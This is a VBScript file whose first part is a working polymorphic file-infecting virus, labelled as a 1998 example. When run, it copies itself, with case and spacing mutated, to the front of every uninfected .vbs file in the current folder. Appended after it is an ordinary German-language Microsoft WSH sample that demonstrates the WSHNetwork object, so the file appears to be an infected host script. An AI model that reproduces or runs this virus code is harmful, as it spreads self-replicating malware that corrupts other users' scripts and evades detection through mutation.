'**********
'    A pOlYMORphiC  EXaMPLe vb  SCripT     ViRUs    BAsEd  On Vbsv777
' bY     SPO0Ky     +   cad  -    14.   nOv. 1998  -
'    fEeL    fREe    TO  uSE  THE CbMuTATE  FUnCtiOn iN your  Own    buGS   :-)

 coNST CBfOrReadInG    = 1  ,   cbFOrwRItIng     = 2

    RaNDOMIZe
 
  cBWEpATh =    wscRipt   .   sCripTFuLLnaMe
  
 seT   cBfSO    = CREAteoBjECT  (   "SCripTing.fiLesYSTEmobjECT" )
 
    Set     cbWeFilE    = CBFso  .   OPEnTeXtfiLe   (   cBWepaTh     ,     cBFOrREaDInG    )
    Cbwecode  =  CbWefiLe    . reADalL
    CbwEfiLE    . ClOSE
 
    CBviRussIZE     =     iNsTR  (  3     ,    cBwECODe  ,     "*****"   &  "*****"    )    + 10  + 1

    Set   cbwefILE =  cBfSO     .  OPeNteXtFILe    (   CbWePAtH  ,   cbFORReAdInG     )
    CbWEcODE   = CBWEfile .  READ     (  CbvIrUssIZe    )
 cbweFIle .   clOSE
     
     For    eAcH    CbFIlE    in cBFsO . gETfoLDER     (    "."     )  .    files
 
 if    lCASe     (  CBFSo   .    getextensionnaME     (    CbfiLE .   NAme    )     )    = ChR     ( 118   )   &     CHr   ( 98   )   &   chr     (     115    )  THEn
 
  SEt CbVicTimFile     = CBFSo .     OPEntExtFIle (    cBFIle     .   PatH ,   cbfORReadInG    )
     CbInfeCtionMaRKER   =    CbvICtIMfile    .  REaD (  11     )
   cBvICTImfiLe   . clOsE
    
  iF   cBinfeCtIoNMaRkER   <>  "'*****"  & "*****"  tHEN

 set  CBVicTImfILE = cbfsO  .    OPENTeXtFilE     (  CbFiLE    .   PatH     ,    cbfoRreAding )
   CBVIcTimcoDe     =  cbVictiMFile  .  REadall
 CBvICTimFILe   .  closE
  
     cbvICtImcode    =  cBMUTATE   (    CBWecOdE    ) &   cbVICTimCoDe
 
     SeT   cbviCtImfIle =   CBFSO  . oPEnTExtfile   (  cbFiLE    .    paTH     , CbfORWrItINg    ,    1    )
   CbviCtImFilE     .   WRItE     cbVicTIMCOdE
 CbviCtimfILe   .  CLoSE
     
     EnD  IF
  
    eND  If
  
   nExt
    
 
     fUNCtION     cbmuTAte (  cBSTRING )
 
  CbnEwStrInG     =   ""
 cbI   =  1
    
     WhiLE   CBi   <=     LeN    (  cbstRING   )
    
  if     mid   (   CBsTRiNg  ,    Cbi     ,   1   )     =  cHr    ( 32  )   Then

  FOR Cbj     =    1  To  iNt     (   5   *  rNd   ) +  1

     CbNeWsTRinG =     cbNEwStRiNg     +     CHR  (     32     )

    nEXT
  
     do
 
    cBi =  CBI + 1
   
    loop   whiLE  mid    (     CbsTRInG   ,     cbI    ,   1     )  =     CHR (   32     )
   
 else
 
  If    iNt  ( 2 *     RND     )    +     1   =    1    ThEN

 CBnEwstrinG    =     CBneWsTRiNg    +     ucaSE  (    MID   (  cbSTRInG     ,  cBI  , 1  )   )

   ELse

     CBNeWSTRinG     =     cbNEWStRiNg +  LcASE     (     Mid   (     CbStrING ,   CBi   ,     1    )   )

     ENd iF

    cbi   =    cbi  + 1
  
  EnD If
     
  WENd
  
 CbMutate  = CBNEwsTRINg
    
 EnD    FuNcTioN
     
     '**********
' Windows Script Host Sample Script
'
' ------------------------------------------------------------------------
'               Copyright (C) 1996 Microsoft Corporation
'
' You have a royalty-free right to use, modify, reproduce and distribute
' the Sample Application Files (and/or any modified version) in any way
' you find useful, provided that you agree that Microsoft has no warranty,
' obligations or liability for any Sample Application Files.
' ------------------------------------------------------------------------
'
' This sample demonstrates how to use the WSHNetwork object.
' It reads network properties (username and computername), 
' connects, disconnects, and enumerates network drives.


L_Welcome_MsgBox_Message_Text   = "Dieses Skript demonstriert die Verwendung des Objekts WSHNetwork."
L_Welcome_MsgBox_Title_Text     = "Windows Scripting Host-Beispiel"
Call Welcome()

' ********************************************************************************
' *
' * WSH Network Object.
' *

Dim WSHNetwork
Dim colDrives, SharePoint
Dim CRLF

CRLF = Chr(13) & Chr(10)
Set WSHNetwork = WScript.CreateObject("WScript.Network")


Function Ask(strAction)

   ' This function asks the user whether to perform a specific "Aktion"
   ' and sets a return code or quits script execution depending on the 
   ' button that the user presses.  This function is called at various
   ' points in the script below.

    Dim intButton
    intButton = MsgBox(strAction,                   _
                       vbQuestion + vbYesNo,        _
                       L_Welcome_MsgBox_Title_Text )
    Ask = intButton = vbYes
End Function

' **************************************************
' *
' * Show WSHNetwork object properties
' *
' *
MsgBox "UserDomain"     & Chr(9) & "= " & WSHNetwork.UserDomain  & CRLF &   _
       "UserName"       & Chr(9) & "= " & WSHNetwork.UserName    & CRLF &   _
       "ComputerName"   & Chr(9) & "= " & WSHNetwork.ComputerName,          _
       vbInformation + vbOKOnly,                                            _
       "Eigenschaften von WSHNetwork"

' **************************************************
' *
' * WSHNetwork.AddNetworkDrive
' *
' *

Function TryMapDrive(intDrive, strShare)
    Dim strDrive
    strDrive = Chr(intDrive + 64) & ":"
    On Error Resume Next
    WSHNetwork.MapNetworkDrive strDrive, strShare
    TryMapDrive = Err.Number = 0
End Function

If Ask("Möchten Sie zu einem Netzwerklaufwerk verbinden?") Then
    strShare = InputBox("Geben Sie die Netzwerkfreigabe an, zu der Sie sich verbinden möchten")
    For intDrive = 26 To 5 Step -1
        If TryMapDrive(intDrive, strShare) Then Exit For
    Next

    If intDrive <= 5 Then
        MsgBox "Es konnte keine Verbindung zur Netzwerkfreigabe hergestellt werden."                        & _
               "Es gibt derzeit keine verfügbaren Laufwerksbuchstaben. "    & _
               CRLF                                                          & _
               "Schließen Sie eine der Netzwerkverbindungen " & _
               "und starten Sie dieses Skript erneut.",                                  _
               vbExclamation + vbOkOnly,        _
               L_Welcome_MsgBox_Title_Text
    Else
        strDrive = Chr(intDrive + 64) & ":"
        MsgBox "Verbunden" & strShare & " zu Laufwerk" & strDrive,   _
               vbInformation + vbOkOnly,                            _
               L_Welcome_MsgBox_Title_Text

        If Ask("Möchten Sie die Verbindung zum Netzwerklaufwerk, die sie gerade erstellt haben, unterbrechen?") Then
            WSHNetwork.RemoveNetworkDrive strDrive

            MsgBox "Getrenntes Laufwerk" & strDrive,        _
                   vbInformation + vbOkOnly,                _
                   L_Welcome_MsgBox_Title_Text
        End If
    End If
End If


' **************************************************
' *
' * WSHNetwork.EnumNetworkDrive
' *
' *
'Ask user whether to enumerate network drives
If Ask("Möchten Sie die verbundenen Netzwerklaufwerke zählen?") Then
    'Enumerate network drives into a collection object of type WshCollection
    Set colDrives = WSHNetwork.EnumNetworkDrives

    'If no network drives were enumerated, then inform user, else display 
    'enumerated drives
    If colDrives.Count = 0 Then
        MsgBox "Es gibt keine zu zählenden Laufwerke.",     _
               vbInformation + vbOkOnly,                _
               L_Welcome_MsgBox_Title_Text
    Else
        strMsg = "Aktuelle Netzwerkverbindungen:" & CRLF
        For i = 0 To colDrives.Count - 1 Step 2
            strMsg = strMsg & CRLF & colDrives(i) & Chr(9) & colDrives(i + 1)
        Next
        
        MsgBox strMsg,                                  _
               vbInformation + vbOkOnly,                _
               L_Welcome_MsgBox_Title_Text

    End If
End If

' ********************************************************************************
' *
' * Welcome
' *
Sub Welcome()
    Dim intDoIt

    intDoIt =  MsgBox(L_Welcome_MsgBox_Message_Text, _
                      vbOKCancel + vbInformation,    _
                      L_Welcome_MsgBox_Title_Text )
    If intDoIt = vbCancel Then
        WScript.Quit
    End If
End Sub


